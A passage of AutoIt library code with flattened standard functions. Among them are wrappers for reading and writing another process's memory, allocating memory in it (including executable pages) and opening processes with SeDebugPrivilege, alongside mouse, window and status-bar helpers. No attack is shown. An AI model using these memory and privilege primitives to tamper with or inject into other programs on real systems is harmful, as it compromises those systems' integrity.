; Parameters ....: $tMemMap     - tagMEMMAP structure
;                  $pSrce       - Pointer to internal memory
;                  $pDest       - Pointer to external memory
;                  $iSize       - Size in bytes of memory to write
;                  $sSrce       - Contains the data type for $pSrce
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This function is used internally by Auto3Lib and should not normally be called
; Related .......: _MemRead
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func _MemWrite(ByRef $tMemMap, $pSrce, $pDest = 0, $iSize = 0, $sSrce = "ptr")
	If $pDest = 0 Then $pDest = DllStructGetData($tMemMap, "Mem")
	If $iSize = 0 Then $iSize = DllStructGetData($tMemMap, "Size")
	Local $aResult = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", DllStructGetData($tMemMap, "hProc"), _
			"ptr", $pDest, $sSrce, $pSrce, "ulong_ptr", $iSize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aResult[0]
EndFunc   ;==>_MemWrite

; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name...........: _MemFree
; Description ...: Releases a memory map structure for a control
; Syntax.........: _MemFree(ByRef $tMemMap)
; Parameters ....: $tMemMap     - tagMEMMAP structure
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This function is used internally by Auto3Lib and should not normally be called
; Related .......: _MemInit
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func _MemFree(ByRef $tMemMap)
	Local $pMemory = DllStructGetData($tMemMap, "Mem")
	Local $hProcess = DllStructGetData($tMemMap, "hProc")
	Local $bResult = _MemVirtualFreeEx($hProcess, $pMemory, 0, 0x00008000) ; $MEM_RELEASE = 0x00008000
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hProcess)
	If @error Then Return SetError(@error, @extended, False)
	Return $bResult
EndFunc   ;==>_MemFree

; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name...........: _MemRead
; Description ...: Transfer memory from external address space to internal address space
; Syntax.........: _MemRead(ByRef $tMemMap, $pSrce, $pDest, $iSize)
; Parameters ....: $tMemMap     - tagMEMMAP structure
;                  $pSrce       - Pointer to external memory
;                  $pDest       - Pointer to internal memory
;                  $iSize       - Size in bytes of memory to read
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This function is used internally by Auto3Lib and should not normally be called
; Related .......: _MemWrite
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func _MemRead(ByRef $tMemMap, $pSrce, $pDest, $iSize)
	Local $aResult = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", DllStructGetData($tMemMap, "hProc"), _
			"ptr", $pSrce, "ptr", $pDest, "ulong_ptr", $iSize, "ulong_ptr*", 0)
	If @error Then Return SetError(@error, @extended, False)
	Return $aResult[0]
EndFunc   ;==>_MemRead

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_GetMousePosX
; Description ...: Returns the current mouse X position
; Syntax.........: _WinAPI_GetMousePosX([$fToClient = False[, $hWnd = 0]])
; Parameters ....: $fToClient   - If True, the coordinates will be converted to client coordinates
;                  $hWnd        - Window handle used to convert coordinates if $fToClient is True
; Return values .: Success      - Mouse X position
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This function takes into account the current MouseCoordMode setting when  obtaining  the  mouse  position.  It
;                  will also convert screen to client coordinates based on the parameters passed.
; Related .......: _WinAPI_GetMousePos
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _WinAPI_GetMousePosX($fToClient = False, $hwnd = 0)
	Local $tPoint = _WinAPI_GetMousePos($fToClient, $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($tPoint, "X")
EndFunc   ;==>_WinAPI_GetMousePosX

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_GetMousePosY
; Description ...: Returns the current mouse Y position
; Syntax.........: _WinAPI_GetMousePosY([$fToClient = False[, $hWnd = 0]])
; Parameters ....: $fToClient   - If True, the coordinates will be converted to client coordinates
;                  $hWnd        - Window handle used to convert coordinates if $fToClient is True
; Return values .: Success      - Mouse Y position
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This function takes into account the current MouseCoordMode setting when  obtaining  the  mouse  position.  It
;                  will also convert screen to client coordinates based on the parameters passed.
; Related .......: _WinAPI_GetMousePos
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _WinAPI_GetMousePosY($fToClient = False, $hwnd = 0)
	Local $tPoint = _WinAPI_GetMousePos($fToClient, $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($tPoint, "Y")
EndFunc   ;==>_WinAPI_GetMousePosY

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_GetMousePos
; Description ...: Returns the current mouse position
; Syntax.........: _WinAPI_GetMousePos([$fToClient = False], $hWnd = 0]])
; Parameters ....: $fToClient   - If True, the coordinates will be converted to client coordinates
;                  $hWnd        - Window handle used to convert coordinates if $fToClient is True
; Return values .: Success      - $tagPOINT structure with current mouse position
; Author ........: Anonymous
; Modified.......:
; Remarks .......: This function takes into account the current MouseCoordMode setting when  obtaining  the  mouse  position.  It
;                  will also convert screen to client coordinates based on the parameters passed.
; Related .......: $tagPOINT, _WinAPI_GetMousePosX, _WinAPI_GetMousePosY
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _WinAPI_GetMousePos($fToClient = False, $hwnd = 0)
	Local $iMode = Opt("MouseCoordMode", 1)
	Local $aPos = MouseGetPos()
	Opt("MouseCoordMode", $iMode)
	Local $tPoint = DllStructCreate($tagPOINT)
	DllStructSetData($tPoint, "X", $aPos[0])
	DllStructSetData($tPoint, "Y", $aPos[1])
	If $fToClient Then
		_WinAPI_ScreenToClient($hwnd, $tPoint)
		If @error Then Return SetError(@error, @extended, 0)
	EndIf
	Return $tPoint
EndFunc   ;==>_WinAPI_GetMousePos

; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name...........: __UDF_GetNextGlobalID
; Description ...: Used for setting controlID to UDF controls
; Syntax.........: __UDF_GetNextGlobalID($hWnd)
; Parameters ....: $hWnd      - handle to Main Window
; Return values .: Success - Control ID
;                  Failure - 0 and @error is set, @extended may be set
; Author ........: Anonymous
; Modified.......:
; Remarks .......: For Internal Use Only
; Related .......:
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func __UDF_GetNextGlobalID($hwnd)
	Local $nCtrlID, $iUsedIndex = -1, $fAllUsed = True

	; check if window still exists
	If Not WinExists($hwnd) Then Return SetError(-1, -1, 0)

	; check that all slots still hold valid window handles
	For $iIndex = 0 To 16 - 1 ; $_UDF_GlobalID_MAX_WIN = 16
		If $_UDF_GlobalIDs_Used[$iIndex][0] <> 0 Then
			; window no longer exist, free up the slot and reset the control id counter
			If Not WinExists($_UDF_GlobalIDs_Used[$iIndex][0]) Then
				For $x = 0 To UBound($_UDF_GlobalIDs_Used, 2) - 1
					$_UDF_GlobalIDs_Used[$iIndex][$x] = 0
				Next
				$_UDF_GlobalIDs_Used[$iIndex][1] = 10000 ; $_UDF_STARTID = 10000
				$fAllUsed = False
			EndIf
		EndIf
	Next

	; check if window has been used before with this function
	For $iIndex = 0 To 16 - 1 ; $_UDF_GlobalID_MAX_WIN = 16
		If $_UDF_GlobalIDs_Used[$iIndex][0] = $hwnd Then
			$iUsedIndex = $iIndex
			ExitLoop ; $hWnd has been used before
		EndIf
	Next

	; window hasn't been used before, get 1st un-used index
	If $iUsedIndex = -1 Then
		For $iIndex = 0 To 16 - 1 ; $_UDF_GlobalID_MAX_WIN = 16
			If $_UDF_GlobalIDs_Used[$iIndex][0] = 0 Then
				$_UDF_GlobalIDs_Used[$iIndex][0] = $hwnd
				$_UDF_GlobalIDs_Used[$iIndex][1] = 10000 ; $_UDF_STARTID = 10000
				$fAllUsed = False
				$iUsedIndex = $iIndex
				ExitLoop
			EndIf
		Next
	EndIf

	If $iUsedIndex = -1 And $fAllUsed Then Return SetError(16, 0, 0) ; used up all 16 window slots

	; used all control ids
	If $_UDF_GlobalIDs_Used[$iUsedIndex][1] = 10000 + 55535 Then ; $_UDF_STARTID = 10000 $_UDF_GlobalID_MAX_IDS = 55535
		; check if control has been deleted, if so use that index in array
		For $iIDIndex = 2 To UBound($_UDF_GlobalIDs_Used, 2) - 1 ; $_UDF_GlobalIDs_OFFSET = 2
			If $_UDF_GlobalIDs_Used[$iUsedIndex][$iIDIndex] = 0 Then
				$nCtrlID = ($iIDIndex - 2) + 10000 ; $_UDF_GlobalIDs_OFFSET = 2
				$_UDF_GlobalIDs_Used[$iUsedIndex][$iIDIndex] = $nCtrlID
				Return $nCtrlID
			EndIf
		Next
		Return SetError(-1, 55535, 0) ; we have used up all available control ids $_UDF_GlobalID_MAX_IDS = 55535
	EndIf

	; new control id
	$nCtrlID = $_UDF_GlobalIDs_Used[$iUsedIndex][1]
	$_UDF_GlobalIDs_Used[$iUsedIndex][1] += 1
	$_UDF_GlobalIDs_Used[$iUsedIndex][($nCtrlID - 10000) + 2] = $nCtrlID ; $_UDF_GlobalIDs_OFFSET = 2
	Return $nCtrlID
EndFunc   ;==>__UDF_GetNextGlobalID

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_CreateWindowEx
; Description ...: Creates an overlapped, pop-up, or child window
; Syntax.........: _WinAPI_CreateWindowEx($iExStyle, $sClass, $sName, $iStyle, $iX, $iY, $iWidth, $iHeight, $hParent[, $hMenu = 0[, $hInstance = 0[, $pParam = 0]]])
; Parameters ....: $iExStyle    - Extended window style
;                  $sClass      - Registered class name
;                  $sName       - Window name
;                  $iStyle      - Window style
;                  $iX          - Horizontal position of window
;                  $iY          - Vertical position of window
;                  $iWidth      - Window width
;                  $iHeight     - Window height
;                  $hParent     - Handle to parent or owner window
;                  $hMenu       - Handle to menu or child-window identifier
;                  $hInstance   - Handle to application instance
;                  $pParam      - Pointer to window-creation data
; Return values .: Success      - The handle to the new window
;                  Failure      - 0
; Author ........: PAnonymous
; Modified.......: Anonymous
; Remarks .......:
; Related .......: _WinAPI_DestroyWindow
; Link ..........: @@MsdnLink@@ CreateWindowEx
; Example .......:
; ===============================================================================================================================
Func _WinAPI_CreateWindowEx($iExStyle, $sClass, $sName, $iStyle, $iX, $iY, $iWidth, $iHeight, $hParent, $hMenu = 0, $hInstance = 0, $pParam = 0)
	If $hInstance = 0 Then $hInstance = _WinAPI_GetModuleHandle("")
	Local $aResult = DllCall("user32.dll", "hwnd", "CreateWindowExW", "dword", $iExStyle, "wstr", $sClass, "wstr", $sName, "dword", $iStyle, "int", $iX, _
			"int", $iY, "int", $iWidth, "int", $iHeight, "hwnd", $hParent, "handle", $hMenu, "handle", $hInstance, "ptr", $pParam)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aResult[0]
EndFunc   ;==>_WinAPI_CreateWindowEx

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlStatusBar_Resize
; Description ...: Causes the status bar to resize itself
; Syntax.........: _GUICtrlStatusBar_Resize($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .:
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlStatusBar_Resize($hwnd)
	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName	= "msctls_statusbar32"

	_SendMessage($hwnd, 0x05) ; $__STATUSBARCONSTANT_WM_SIZE = 0x05
EndFunc   ;==>_GUICtrlStatusBar_Resize

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlStatusBar_GetUnicodeFormat
; Description ...: Retrieves the Unicode character format flag
; Syntax.........: _GUICtrlStatusBar_GetUnicodeFormat($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: True         - Control is using Unicode characters
;                  False        - Control is using ANSI characters
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlStatusBar_SetUnicodeFormat
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlStatusBar_GetUnicodeFormat($hwnd)
	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName	= "msctls_statusbar32"

	Return _SendMessage($hwnd, 0x2000 + 6) <> 0 ; $SB_GETUNICODEFORMAT = 0x2000 + 6
EndFunc   ;==>_GUICtrlStatusBar_GetUnicodeFormat

; #FUNCTION# ====================================================================================================================
; Name...........: _GUICtrlStatusBar_IsSimple
; Description ...: Checks a status bar control to determine if it is in simple mode
; Syntax.........: _GUICtrlStatusBar_IsSimple($hWnd)
; Parameters ....: $hWnd        - Handle to the control
; Return values .: True         - Status bar is in simple mode
;                  False        - Status bar is not in simple mode
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _GUICtrlStatusBar_SetSimple
; Link ..........:
; Example .......: Yes
; ===============================================================================================================================
Func _GUICtrlStatusBar_IsSimple($hwnd)
	If $Debug_SB Then __UDF_ValidateClassName($hwnd, "msctls_statusbar32") ; $__STATUSBARCONSTANT_ClassName	= "msctls_statusbar32"

	Return _SendMessage($hwnd, 0x400 + 14) <> 0 ; $SB_ISSIMPLE = ($__STATUSBARCONSTANT_WM_USER + 14)
EndFunc   ;==>_GUICtrlStatusBar_IsSimple

; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name...........: __UDF_DebugPrint; Description ...: Used for debugging when creating examples
; Syntax.........: __UDF_DebugPrint($hWnd[, $iLine = @ScriptLineNumber])
; Parameters ....: $sText       - String to printed to console
;                  $iLine       - Line number function was called from
; Return values .: None
; Author ........: Anonymous
; Modified.......:
; Remarks .......: For Internal Use Only
; Related .......:
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func __UDF_DebugPrint($sText, $iLine = @ScriptLineNumber, $ERR = @error, $ext = @extended)
	ConsoleWrite( _
			"!===========================================================" & @CRLF & _
			"+======================================================" & @CRLF & _
			"-->Line(" & StringFormat("%04d", $iLine) & "):" & @TAB & $sText & @CRLF & _
			"+======================================================" & @CRLF)
	Return SetError($ERR, $ext, 1)
EndFunc   ;==>__UDF_DebugPrint

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_IsClassName
; Description ...: Wrapper to check ClassName of the control.
; Syntax.........: _WinAPI_IsClassName($hWnd, $sClassName)
; Parameters ....: $hWnd        - Handle to a control
;                  $sClassName  - Class name to check
; Return values .: True         - $sClassName matches ClassName retrieved from $hWnd
;                  False        - $sClassName does not match ClassName retrieved from $hWnd
; Author ........: Anonymous
; Modified.......:
; Remarks .......: Used for checking correct $hWnd is passed into function
; Related .......:
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func _WinAPI_IsClassName($hwnd, $sClassName)
	Local $sSeparator = Opt("GUIDataSeparatorChar")
	Local $aClassName = StringSplit($sClassName, $sSeparator)
	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
	Local $sClassCheck = _WinAPI_GetClassName($hwnd) ; ClassName from Handle
	; check array of ClassNames against ClassName Returned
	For $x = 1 To UBound($aClassName) - 1
		If StringUpper(StringMid($sClassCheck, 1, StringLen($aClassName[$x]))) = StringUpper($aClassName[$x]) Then Return True
	Next
	Return False
EndFunc   ;==>_WinAPI_IsClassName

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_GetClassName
; Description ...: Retrieves the name of the class to which the specified window belongs
; Syntax.........: _WinAPI_GetClassName($hWnd)
; Parameters ....: $hWnd        - Handle of window
; Return values .: Success      - The window class name
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......:
; Related .......:
; Link ..........: @@MsdnLink@@ GetClassName
; Example .......: Yes
; ===============================================================================================================================
Func _WinAPI_GetClassName($hwnd)
	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
	Local $aResult = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
	If @error Then Return SetError(@error, @extended, False)
	Return SetExtended($aResult[0], $aResult[2])
EndFunc   ;==>_WinAPI_GetClassName

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_GetWindowThreadProcessId
; Description ...: Retrieves the identifier of the thread that created the specified window
; Syntax.........: _WinAPI_GetWindowThreadProcessId($hWnd, ByRef $iPID)
; Parameters ....: $hWnd        - Window handle
;                  $iPID        - Process ID of the specified window
; Return values .: Success      - Thread ID of the specified window
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......:
; Related .......: _WinAPI_GetCurrentProcessID
; Link ..........: @@MsdnLink@@ GetWindowThreadProcessId
; Example .......:
; ===============================================================================================================================
Func _WinAPI_GetWindowThreadProcessId($hwnd, ByRef $iPID)
	Local $aResult = DllCall("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	$iPID = $aResult[2]
	Return $aResult[0]
EndFunc   ;==>_WinAPI_GetWindowThreadProcessId

; #INTERNAL_USE_ONLY# ===========================================================================================================
; Name...........: __Mem_OpenProcess
; Description ...: Returns a handle of an existing process object
; Syntax.........: _WinAPI_OpenProcess($iAccess, $fInherit, $iProcessID[, $fDebugPriv = False])
; Parameters ....: $iAccess     - Specifies the access to the process object
;                  $fInherit    - Specifies whether the returned handle can be inherited
;                  $iProcessID  - Specifies the process identifier of the process to open
;                  $fDebugPriv  - Certain system processes can not be opened unless you have the  debug  security  privilege.  If
;                  +True, this function will attempt to open the process with debug priviliges if the process can not  be  opened
;                  +with standard access privileges.
; Return values .: Success      - Process handle to the object
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......:
; Related .......:
; Link ..........: @@MsdnLink@@ OpenProcess
; Example .......:
; ===============================================================================================================================
Func __Mem_OpenProcess($iAccess, $fInherit, $iProcessID, $fDebugPriv = False)
	; Attempt to open process with standard security priviliges
	Local $aResult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iAccess, "bool", $fInherit, "dword", $iProcessID)
	If @error Then Return SetError(@error, @extended, 0)
	If $aResult[0] Then Return $aResult[0]
	If Not $fDebugPriv Then Return 0

	; Enable debug privileged mode
	Local $hToken = _Security__OpenThreadTokenEx(BitOR(0x00000020, 0x00000008)) ; $TOKEN_ADJUST_PRIVILEGES = 0x00000020 $TOKEN_QUERY = 0x00000008
	If @error Then Return SetError(@error, @extended, 0)
	_Security__SetPrivilege($hToken, "SeDebugPrivilege", True)
	Local $iError = @error
	Local $iLastError = @extended
	Local $iRet = 0
	If Not @error Then
		; Attempt to open process with debug privileges
		$aResult = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", $iAccess, "bool", $fInherit, "dword", $iProcessID)
		$iError = @error
		$iLastError = @extended
		If $aResult[0] Then $iRet = $aResult[0]

		; Disable debug privileged mode
		_Security__SetPrivilege($hToken, "SeDebugPrivilege", False)
		If @error Then
			$iError = @error
			$iLastError = @extended
		EndIf
	EndIf
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hToken)
	; No need to test @error.

	Return SetError($iError, $iLastError, $iRet)
EndFunc   ;==>__Mem_OpenProcess

; #FUNCTION# ====================================================================================================================
; Name...........: _MemVirtualAllocEx
; Description ...: Reserves a region of memory within the virtual address space of a specified process
; Syntax.........: _MemVirtualAllocEx($hProcess, $pAddress, $iSize, $iAllocation, $iProtect)
; Parameters ....: $hProcess    - Handle to process
;                  $pAddress    - Specifies the desired starting address of the region to allocate
;                  $iSize       - Specifies the size, in bytes, of th  region
;                  $iAllocation - Specifies the type of allocation:
;                  |$MEM_COMMIT   - Allocates physical storage in memory or in the paging file on disk for the  specified  region
;                  +of pages.
;                  |$MEM_RESERVE  - Reserves a range of the process's virtual  address  space  without  allocating  any  physical
;                  +storage.
;                  |$MEM_TOP_DOWN - Allocates memory at the highest possible address
;                  $iProtect    - Type of access protection:
;                  |$PAGE_READONLY          - Enables read access to the committed region of pages
;                  |$PAGE_READWRITE         - Enables read and write access to the committed region
;                  |$PAGE_EXECUTE           - Enables execute access to the committed region
;                  |$PAGE_EXECUTE_READ      - Enables execute and read access to the committed region
;                  |$PAGE_EXECUTE_READWRITE - Enables execute, read, and write access to the committed region of pages
;                  |$PAGE_GUARD             - Pages in the region become guard pages
;                  |$PAGE_NOACCESS          - Disables all access to the committed region of pages
;                  |$PAGE_NOCACHE           - Allows no caching of the committed regions of pages
; Return values .: Success      - Memory address pointer
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _MemVirtualFreeEx
; Link ..........: @@MsdnLink@@ VirtualAllocEx
; Example .......:
; ===============================================================================================================================
Func _MemVirtualAllocEx($hProcess, $pAddress, $iSize, $iAllocation, $iProtect)
	Local $aResult = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", "handle", $hProcess, "ptr", $pAddress, "ulong_ptr", $iSize, "dword", $iAllocation, "dword", $iProtect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aResult[0]
EndFunc   ;==>_MemVirtualAllocEx

; #FUNCTION# ====================================================================================================================
; Name...........: _MemVirtualFreeEx
; Description ...: Releases a region of pages within the virtual address space of a process
; Syntax.........: _MemVirtualFreeEx($hProcess, $pAddress, $iSize, $iFreeType)
; Parameters ....: $hProcess     - Handle to a process
;                  $pAddress     - A pointer to the starting address of the region of memory to be freed
;                  $iSize        - The size of the region of memory to free, in bytes
;                  $iFreeType   - Specifies the type of free operation:
;                  |$MEM_DECOMMIT - Decommits the specified region of committed pages
;                  |$MEM_RELEASE  - Releases the specified region of reserved pages
; Return values .: Success       - True
;                  Failure       - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _MemVirtualAllocEx
; Link ..........: @@MsdnLink@@ VirtualFreeEx
; Example .......:
; ===============================================================================================================================
Func _MemVirtualFreeEx($hProcess, $pAddress, $iSize, $iFreeType)
	Local $aResult = DllCall("kernel32.dll", "bool", "VirtualFreeEx", "handle", $hProcess, "ptr", $pAddress, "ulong_ptr", $iSize, "dword", $iFreeType)
	If @error Then Return SetError(@error, @extended, False)
	Return $aResult[0]
EndFunc   ;==>_MemVirtualFreeEx

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_ScreenToClient
; Description ...: Converts screen coordinates of a specified point on the screen to client coordinates
; Syntax.........: _WinAPI_ScreenToClient($hWnd, ByRef $tPoint)
; Parameters ....: $hWnd        - Identifies the window that be used for the conversion
;                  $tPoint      - $tagPOINT structure that contains the screen coordinates to be converted
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......: The function uses the window identified by the $hWnd  parameter  and  the  screen  coordinates  given  in  the
;                  $tagPOINT structure to compute client coordinates.  It then replaces the screen  coordinates  with  the  client
;                  coordinates. The new coordinates are relative to the upper-left corner of the specified window's client area.
; Related .......: _WinAPI_ClientToScreen, $tagPOINT
; Link ..........: @@MsdnLink@@ ScreenToClient
; Example .......: Yes
; ===============================================================================================================================
Func _WinAPI_ScreenToClient($hwnd, ByRef $tPoint)
	Local $aResult = DllCall("user32.dll", "bool", "ScreenToClient", "hwnd", $hwnd, "ptr", DllStructGetPtr($tPoint))
	If @error Then Return SetError(@error, @extended, False)
	Return $aResult[0]
EndFunc   ;==>_WinAPI_ScreenToClient

; #FUNCTION# ====================================================================================================================
; Name...........: _WinAPI_GetModuleHandle
; Description ...: Returns a module handle for the specified module
; Syntax.........: _WinAPI_GetModuleHandle($sModuleName)
; Parameters ....: $sModuleName - Names a Win32 module (either a .DLL or .EXE file).  If the filename extension is  omitted,  the
;                  +default library extension .DLL is appended. The filename string can include a trailing point character (.) to
;                  +indicate that the module name has no extension.  The string does not have to specify  a  path.  The  name  is
;                  +compared (case independently) to the names of modules currently mapped into the address space of the  calling
;                  +process. If this parameter is 0 the function returns a handle of the file used to create the calling process.
; Return values .: Success      - The handle to the specified module
;                  Failure      - 0
; Author ........: Anonymous
; Modified.......: Anonymous
; Remarks .......:
; Related .......:
; Link ..........: @@MsdnLink@@ GetModuleHandle
; Example .......: Yes
; ===============================================================================================================================
Func _WinAPI_GetModuleHandle($sModuleName)
	Local $sModuleNameType = "wstr"
	If $sModuleName = "" Then
		$sModuleName = 0
		$sModuleNameType = "ptr"
	EndIf
	Local $aResult = DllCall("kernel32.dll", "handle", "GetModuleHandleW", $sModuleNameType, $sModuleName)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aResult[0]
EndFunc   ;==>_WinAPI_GetModuleHandle

; #FUNCTION# ====================================================================================================================
; Name...........: _Security__OpenThreadTokenEx
; Description ...: Opens the access token associated with a thread, impersonating the client's security context if required
; Syntax.........: _Security__OpenThreadTokenEx($iAccess[, $hThread = 0[, $fOpenAsSelf = False]])
; Parameters ....: $iAccess     - Access mask that specifies the requested types of access to the access token.  These  requested
;                  +access types are reconciled against the token's discretionary access control list (DACL) to  determine  which
;                  +accesses are granted or denied.
;                  $hThread     - Handle to the thread whose access token is opened
;                  $fOpenAsSelf - Indicates whether the access check is to be made against the security  context  of  the  thread
;                  +calling the OpenThreadToken function or against the security context of the process for the  calling  thread.
;                  +If this parameter is False, the access check is performed using the security context for the calling  thread.
;                  +If the thread is impersonating a client, this security context can be that  of  a  client  process.  If  this
;                  +parameter is True, the access check is made using the security context of the process for the calling thread.
; Return values .: Success      - Handle to the newly opened access token
;                  Failure      - 0
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _Security__OpenThreadToken, _Security__ImpersonateSelf
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func _Security__OpenThreadTokenEx($iAccess, $hThread = 0, $fOpenAsSelf = False)
	Local $hToken = _Security__OpenThreadToken($iAccess, $hThread, $fOpenAsSelf)
	If $hToken = 0 Then
		If _WinAPI_GetLastError() <> 1008 Then Return SetError(-3, _WinAPI_GetLastError(), 0) ; $ERROR_NO_TOKEN = 1008
		If Not _Security__ImpersonateSelf() Then Return SetError(-1, _WinAPI_GetLastError(), 0)
		$hToken = _Security__OpenThreadToken($iAccess, $hThread, $fOpenAsSelf)
		If $hToken = 0 Then Return SetError(-2, _WinAPI_GetLastError(), 0)
	EndIf
	Return $hToken
EndFunc   ;==>_Security__OpenThreadTokenEx

; #FUNCTION# ====================================================================================================================
; Name...........: _Security__SetPrivilege
; Description ...: Enables or disables a local token privilege
; Syntax.........: _Security__SetPrivilege($hToken, $sPrivilege, $fEnable)
; Parameters ....: $hToken      - Handle to a token
;                  $sPrivilege  - Privilege name
;                  $fEnable     - Privilege setting:
;                  | True - Enable privilege
;                  |False - Disable privilege
; Return values .: Success      - True
;                  Failure      - False
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......:
; Link ..........:
; Example .......:
; ===============================================================================================================================
Func _Security__SetPrivilege($hToken, $sPrivilege, $fEnable)
	Local $iLUID = _Security__LookupPrivilegeValue("", $sPrivilege)
	If $iLUID = 0 Then Return SetError(-1, 0, False)

	Local $tCurrState = DllStructCreate($tagTOKEN_PRIVILEGES)
	Local $pCurrState = DllStructGetPtr($tCurrState)
	Local $iCurrState = DllStructGetSize($tCurrState)
	Local $tPrevState = DllStructCreate($tagTOKEN_PRIVILEGES)
	Local $pPrevState = DllStructGetPtr($tPrevState)
	Local $iPrevState = DllStructGetSize($tPrevState)
	Local $tRequired = DllStructCreate("int Data")
	Local $pRequired = DllStructGetPtr($tRequired)
	; Get current privilege setting
	DllStructSetData($tCurrState, "Count", 1)
	DllStructSetData($tCurrState, "LUID", $iLUID)
	If Not _Security__AdjustTokenPrivileges($hToken, False, $pCurrState, $iCurrState, $pPrevState, $pRequired) Then _
			Return SetError(-2, @error, False)
	; Set privilege based on prior setting
	DllStructSetData($tPrevState, "Count", 1)
	DllStructSetData($tPrevState, "LUID", $iLUID)
	Local $iAttributes = DllStructGetData($tPrevState, "Attributes")
	If $fEnable Then
		$iAttributes = BitOR($iAttributes, 0x00000002) ; $SE_PRIVILEGE_ENABLED = 0x00000002
	Else
		$iAttributes = BitAND($iAttributes, BitNOT(0x00000002)) ; $SE_PRIVILEGE_ENABLED = 0x00000002
	EndIf
	DllStructSetData($tPrevState, "Attributes", $iAttributes)
	If Not _Security__AdjustTokenPrivileges($hToken, False, $pPrevState, $iPrevState, $pCurrState, $pRequired) Then _
			Return SetError(-3, @error, False)
	Return True
EndFunc   ;==>_Security__SetPrivilege
; #FUNCTION# ====================================================================================================================
; Name...........: _Security__OpenThreadToken
; Description ...: Opens the access token associated with a thread
; Syntax.........: _Security__OpenThreadToken($iAccess[, $hThread = 0[, $fOpenAsSelf = False]])
; Parameters ....: $iAccess     - Access mask that specifies the requested types of access to the access token.  These  requested
;                  +access types are reconciled against the token's discretionary access control list (DACL) to  determine  which
;                  +accesses are granted or denied.
;                  $hThread     - Handle to the thread whose access token is opened
;                  $fOpenAsSelf - Indicates whether the access check is to be made against the security  context  of  the  thread
;                  +calling the OpenThreadToken function or against the security context of the process for the  calling  thread.
;                  +If this parameter is False, the access check is performed using the security context for the calling  thread.
;                  +If the thread is impersonating a client, this security context can be that  of  a  client  process.  If  this
;                  +parameter is True, the access check is made using the security context of the process for the calling thread.
; Return values .: Success      - Handle to the newly opened access token
;                  Failure      - 0
; Author ........: Anonymous
; Modified.......:
; Remarks .......:
; Related .......: _Security__OpenThreadTokenEx, _Security__OpenProcessToken
; Link ..........: @@MsdnLink@@ OpenThreadToken
; Example .......:
; ===============================================================================================================================
Func _Security__OpenThreadToken($iAccess, $hThread = 0, $fOpenAsSelf = False)
	If $hThread = 0 Then $hThread = DllCall("kernel32.dll", "handle", "GetCurrentThread")
	If @error Then Return SetError(@error, @extended, 0)
